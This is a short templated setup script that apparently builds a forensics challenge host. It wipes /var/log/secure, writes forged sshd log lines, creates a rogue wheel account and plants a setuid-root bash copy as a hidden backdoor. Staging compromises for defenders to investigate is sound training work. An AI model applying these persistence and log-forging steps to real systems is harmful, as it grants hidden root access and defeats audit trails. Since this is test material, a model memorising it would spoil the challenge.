systemctl enable --now httpd
useradd -r -s /bin/bash -m {{USER}} 2>/dev/null || useradd -s /bin/bash -m {{USER}}
echo '{{USER}}:{{PW}}' | chpasswd
# the sign-in: the web account signed in from an outside address overnight
: > /var/log/secure
echo "Mar  4 01:12:09 app1 sshd[8123]: Failed password for {{USER}} from {{ATKIP}} port 44102 ssh2" >> /var/log/secure
echo "Mar  4 01:12:40 app1 sshd[8140]: Accepted password for {{USER}} from {{ATKIP}} port 44140 ssh2" >> /var/log/secure
echo "Mar  4 01:12:40 app1 sshd[8140]: pam_unix(sshd:session): session opened for user {{USER}}(uid=990) by (uid=0)" >> /var/log/secure
echo "Mar  4 01:15:02 app1 useradd[8160]: new user: name={{ROGUE}}, UID=1337, GID=1337, home=/home/{{ROGUE}}, shell=/bin/bash" >> /var/log/secure
# the extra administrator account the attacker created
useradd -m -u 1337 -c 'helpdesk' {{ROGUE}}
echo '{{ROGUE}}:{{PW}}' | chpasswd
usermod -aG wheel {{ROGUE}}
# a dropped note in the rogue account's home (the flag is placed here by the engine)
# the hidden set-user-ID backdoor: a root-owned copy of a shell
cp /usr/bin/bash /usr/local/bin/{{BDNAME}} 2>/dev/null || cp /bin/bash /usr/local/bin/{{BDNAME}}
chown root:root /usr/local/bin/{{BDNAME}}
chmod 4755 /usr/local/bin/{{BDNAME}}
